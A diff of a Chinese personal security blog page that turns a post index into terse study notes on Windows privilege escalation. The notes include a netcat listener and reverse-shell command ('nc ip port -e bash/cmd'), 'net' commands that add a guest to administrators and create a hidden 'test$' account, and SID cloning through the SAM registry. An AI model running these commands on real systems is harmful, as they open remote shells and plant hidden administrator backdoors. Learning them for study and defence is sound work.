@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>godsfall</title>
+<title>系统提权 | godsfall</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
@@ -18,10 +18,17 @@
 
 
 
-    <meta name="description" content=" &lt;marquee  behavior=&#34;scroll&#34; scrollamount=&#34;4&#34;&gt;&lt;font    color=&#34;#F5F5F5&#34;  size=&#34;3&#34; &gt;行尽天涯静默山水间，倾听晚风拂柳笛声残&lt;/font&gt;&lt;/marquee&gt;">
-    
-      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
-    
+    <meta name="description" content="用户的权限是由它所在用户组决定的
+nc -lp 666
+nc ip port -e bash/cmd
+1.win
+计算机管理，本地用户
+内置用户
+administrator
+guest来宾账户，默认禁用
+用户组
+administrators..." />
+    <meta name="keywords" content="" />
   </head>
   <body>
     <div id="app" class="main">
@@ -96,64 +103,55 @@
 
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
-          
-            <article class="post-item">
-              <div class="left">
-                <a href="https://gods-fall.github.io/11-gong-ji-lu-jing/">
-                  <h2 class="post-title">1.1攻击路径</h2>
-                </a>
-                <div class="post-date">
-                  2021-12-29
-                </div>
-                <div class="post-abstract">
-                  <p>攻击分类<br>
-（1）互联网web系统应用<br>
-（2）移动应用app<br>
-（3）互联网系统与服务<br>
-（4）社会工程<br>
-（5）供应链<br>
-（6）互联网旁站<br>
-（7）近源</p>
-
-                </div>
+          <div class="post-detail">
+            <h2 class="post-title">系统提权</h2>
+            <div class="post-date">2022-02-19</div>
+            
+              <div class="feature-container" style="background-image: url('https://uploadfile.bizhizu.cn/up/f7/a0/6f/f7a06fcf03ec238d08ddb7cbd035fdd5.jpg')">
               </div>
-              
-                <a class="right" href="https://gods-fall.github.io/11-gong-ji-lu-jing/">
-                  <div class="feature-container" style="background-image: url('https://macjpeg.macsc.com/macdown/pic/202006/29095630_f105f0c69f.jpeg')">
-                  </div>
-                </a>
-              
-            </article>
-          
-            <article class="post-item">
-              <div class="left">
-                <a href="https://gods-fall.github.io/1/">
-                  <h2 class="post-title">关于我</h2>
-                </a>
-                <div class="post-date">
-                  2021-12-06
-                </div>
-                <div class="post-abstract">
-                  <p>第一次在GitHub建博客没想到挺好玩的，嘿嘿。<br>
-今后我所有的文章将会投到这里，欢迎有人来看，如果没有也没关系，哈哈，也许有一天就有了呢。</p>
+            
+            <div class="post-content" v-pre>
+              <p>用户的权限是由它所在用户组决定的<br>
+nc -lp 666<br>
+nc ip port -e bash/cmd<br>
+1.win<br>
+计算机管理，本地用户<br>
+内置用户<br>
+administrator<br>
+guest来宾账户，默认禁用<br>
+用户组<br>
+administrators<br>
+users（默认创建）<br>
+guests<br>
+iusrs web客户端匿名访问  guests<br>
+iwam iis应用程序运行   iis_wpgiis_wpg<br>
+用户(admin)<br>
+net user 当前系统用户 +administrator 查看用户信息<br>
+net user xx  123 /add&amp; /del&amp;/active:no(启用、禁用)<br>
+用户组<br>
+net localgroup administrators<br>
+net localgroup administrators   guest /add<br>
+明文密码(没玩明白，不如获取明文)<br>
+抓取hash<br>
+建立隐藏账号<br>
+net user test$ 123 /add<br>
+安全标识符sid（whoami/all） rid 500<br>
+注册表sam domains account names 1f4 :500<br>
+导出删除 重新导入<br>
+伪造克隆sid<br>
+系统日志：计算机管理 事件查看器<br>
+system security application<br>
+https://cloud.tencent.com/developer/article/1769697 分析参考<br>
+网站活动日志：<br>
+iis nginx 阿帕奇 宝塔</p>
 
-                </div>
-              </div>
-              
-                <a class="right" href="https://gods-fall.github.io/1/">
-                  <div class="feature-container" style="background-image: url('https://tse1-mm.cn.bing.net/th/id/R-C.b86bfcb8f4cc67d1ce5f1ebdfab0664e?rik=uiJfMFDhFvZ%2f5A&amp;riu=http%3a%2f%2fwww.pp3.cn%2fuploads%2fallimg%2f200803%2f14-200P3110943.jpg&amp;ehk=HuXirrYNE7qHFVe%2bwB7cRaXqesm5REasd%2b1q6Bl2qoY%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0')">
-                  </div>
-                </a>
-              
-            </article>
-          
+            </div>
+            
+            
 
-          <div class="pagination-container">
-  
-    <a href="https://gods-fall.github.io/" class="prev"><i class="icon-arrow-ios-back-outline"></i> 上一页</a>
-  
-  
-</div>
+            
+
+          </div>
 
         </div>
       </div>
